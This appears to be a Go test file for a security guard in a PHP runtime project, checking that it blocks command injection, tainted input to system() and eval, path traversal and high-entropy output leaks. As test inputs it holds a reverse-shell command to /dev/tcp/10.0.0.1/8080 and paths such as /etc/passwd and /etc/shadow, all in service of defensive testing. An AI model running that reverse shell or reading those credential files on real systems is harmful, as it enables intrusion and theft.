// SPDX-License-Identifier: Apache-2.0 OR MIT

package security

import (
	"crypto/rand"
	"testing"

	"code.hazyhaar.fr/devhoros/php127/types"
)

func TestIngressInspectNominal(t *testing.T) {
	g := NewGuard(ModeEnforce)
	input := []byte("jean.dupont@example.com")
	v, err := g.IngressInspect(input)
	if err != nil {
		t.Fatalf("IngressInspect nominal failed: %v", err)
	}

	if !v.IsTainted() {
		t.Fatalf("L'entrée utilisateur doit être marquée Tainted")
	}
	if v.String() != string(input) {
		t.Fatalf("Valeur altérée: got %q, want %q", v.String(), string(input))
	}
}

func TestCommandInjectionVeto(t *testing.T) {
	g := NewGuard(ModeEnforce)

	maliciousInput := []byte("id; bash -i >& /dev/tcp/10.0.0.1/8080 0>&1")
	_, err := g.IngressInspect(maliciousInput)
	if err != ErrSecurityCommandInjection {
		t.Fatalf("Attendu ErrSecurityCommandInjection, got: %v", err)
	}
}

func TestTaintSinkViolation(t *testing.T) {
	g := NewGuard(ModeEnforce)

	// Donnée utilisateur non nettoyée
	userInput := types.NewString("cat /etc/hosts").WithTaint(types.FlagTaintedUserInput)
	err := g.CheckSink("system", userInput)
	if err != ErrSecurityTaintSinkViolation {
		t.Fatalf("Attendu ErrSecurityTaintSinkViolation sur system(), got: %v", err)
	}

	// Donnée système certifiée
	trustedInput := userInput.ClearTaint().WithTaint(types.FlagTrustedSystem)
	if err := g.CheckSink("system", trustedInput); err != nil {
		t.Fatalf("Donnée certifiée rejetée à tort: %v", err)
	}
}

func TestCodeInjectionVeto(t *testing.T) {
	g := NewGuard(ModeEnforce)

	// Dynamic eval without trusted system flag
	evalPayload := types.NewString("phpinfo();")
	err := g.CheckSink("eval", evalPayload)
	if err != ErrSecurityCodeInjection {
		t.Fatalf("Attendu ErrSecurityCodeInjection sur eval sans FlagTrustedSystem, got: %v", err)
	}

	// Certified system eval
	trustedEval := evalPayload.WithTaint(types.FlagTrustedSystem)
	if err := g.CheckSink("eval", trustedEval); err != nil {
		t.Fatalf("Eval certifié système rejeté: %v", err)
	}
}

func TestModeAuditVsEnforce(t *testing.T) {
	gAudit := NewGuard(ModeAudit)

	// Mode audit: records anomalies but does not return error
	maliciousInput := []byte("id; bash -i >& /dev/tcp/10.0.0.1/8080 0>&1")
	v, err := gAudit.IngressInspect(maliciousInput)
	if err != nil {
		t.Fatalf("ModeAudit ne doit pas bloquer: %v", err)
	}
	if !v.IsTainted() {
		t.Fatalf("ModeAudit doit marquer la valeur comme Tainted")
	}
	if gAudit.AnomaliesCount == 0 {
		t.Fatalf("ModeAudit doit incrémenter AnomaliesCount")
	}
}

func TestPathTraversalVeto(t *testing.T) {
	g := NewGuard(ModeEnforce)

	traversalPath := types.NewString("../../etc/passwd")
	err := g.CheckSink("file_get_contents", traversalPath)
	if err != ErrSecurityPathTraversal {
		t.Fatalf("Attendu ErrSecurityPathTraversal, got: %v", err)
	}

	etcPath := types.NewString("/etc/shadow")
	errEtc := g.CheckSink("file_get_contents", etcPath)
	if errEtc != ErrSecurityPathTraversal {
		t.Fatalf("Attendu ErrSecurityPathTraversal sur /etc/shadow, got: %v", errEtc)
	}
}

func TestEgressHighEntropyExfiltration(t *testing.T) {
	g := NewGuard(ModeEnforce)

	// Sortie nominale HTML
	htmlOut := []byte("<html><body><h1>Bienvenue sur PHP 127</h1></body></html>")
	if err := g.EgressInspect(htmlOut); err != nil {
		t.Fatalf("Sortie HTML nominale rejetée: %v", err)
	}

	// Simulation d'une clé privée / blob chiffré haute entropie non masqué (256 octets pseudo-aléatoires)
	cryptoBlob := make([]byte, 256)
	_, _ = rand.Read(cryptoBlob)
	err := g.EgressInspect(cryptoBlob)
	if err != ErrSecurityExfiltrationBlock {
		t.Fatalf("Attendu ErrSecurityExfiltrationBlock sur fuite crypto, got: %v", err)
	}
}
